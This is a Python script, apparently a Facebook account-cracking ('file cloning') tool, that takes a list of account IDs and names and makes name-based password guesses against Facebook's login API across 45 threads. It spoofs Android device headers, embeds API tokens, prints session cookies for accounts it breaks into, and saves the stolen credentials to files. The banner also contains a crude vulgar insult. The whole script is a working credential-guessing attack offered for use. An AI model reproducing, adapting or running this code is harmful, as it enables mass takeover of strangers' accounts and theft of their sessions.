#Coded by HASNAIN ALI . Modified by RABIA
import os,time,random,re,sys,string, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#________________________________________#
logo = f"""{WHITE}
     ███╗   ██╗ █████╗ ██╗███╗   ██╗
     ████╗  ██║██╔══██╗██║████╗  ██║ 
     ██╔██╗ ██║███████║██║██╔██╗ ██║
     ██║╚██╗██║██╔══██║██║██║╚██╗██║
     ██║ ╚████║██║  ██║██║██║ ╚████║               ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═══╝  {BLUE}X {RED}||•❤️•||N9||N||•❤️•|| {WHITE}

\t[×] Developed By HASNAIN ALI{EXTRA} (NAIN)
{WHITE}[•] AUTHOR       : HASNAIN ALI
{WHITE}[•] STYLE        : BACHA TARE MA KE CHOOT
{WHITE}[•] WhatsApp.    :  +923043350288
[•] FaceBook     :   7H3 N91N 
[•] Version      :   {RED}S1.1
{WHITE}[•] YouTube      :   HASNAIN TEACH HZ
                 {G}HASNAINX3ALONE
{RED}================================================
     {G}=====TH3 N91N ON F1RE SHAPER FELL KRO=====
{BLUE}================================================="""

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m---------------------------------')

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    lin3()
    cp =input('[?] Choice : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write('\r\r\033[1;37m [NAIN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oku)));sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads="Dalvik/2.1.0 (Linux; U; Android 11; Itel A25 Build/RP1A.382822.020)Dalvik/2.1.0 (Linux; U; Android 6; Itel A25 Build/MG837U)Dalvik/2.1.0 (Linux; U; Android 14; Itel A25 Build/TQ1A.519271.077)Dalvik/2.1.0 (Linux; U; Android 9; Itel A25 Build/PD2A.423878.034)Dalvik/2.1.0 (Linux; U; Android 8; Itel A25 Build/OPM7.190808.090)Dalvik/2.1.0 (Linux; U; Android 8; Itel A25 Build/OPD3.774463.051)Dalvik/2.1.0 (Linux; U; Android 14; Itel A25 Build/TP1A.864805.086)Dalvik/2.1.0 (Linux; U; Android 6; Itel A25 Build/M94MVO)Dalvik/2.1.0 (Linux; U; Android 5; Itel A25 Build/LCC1KE)Dalvik/2.1.0 (Linux; U; Android 5; Itel A25 Build/LMWQNM);]" 
#Put Your user Agent Here
              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
              if "session_key" in response:
                 oku.append(acc)
                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
                 print('\033[1;32m[NAIN-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 print("Cookie=",cookie)
                 open('/sdcard/NAIN-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                print('\033[1;31m[ALONE-CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
                open('/sdcard/ALONE-CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
     except Exception as e:
       print(e);time.sleep(10)
  
    with tpe(max_workers=45) as tp:
            tp.map(start,idx)
    exit()    



main_menu()